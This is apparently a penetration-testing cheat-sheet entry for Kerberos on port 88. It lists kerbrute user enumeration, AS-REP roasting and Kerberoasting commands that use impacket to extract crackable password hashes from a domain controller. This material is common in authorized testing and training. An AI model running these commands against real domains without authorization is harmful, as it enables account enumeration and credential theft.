# 🐕 Kerberos (Port 88)
### ⚡ Quick Wins
- [ ] **User Enum:** `kerbrute userenum -d <DOMAIN> --dc <IP> users.txt`

### 🔍 Enumeration
- **AS-REP Roasting:** `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat`
- **Kerberoasting:** `impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request`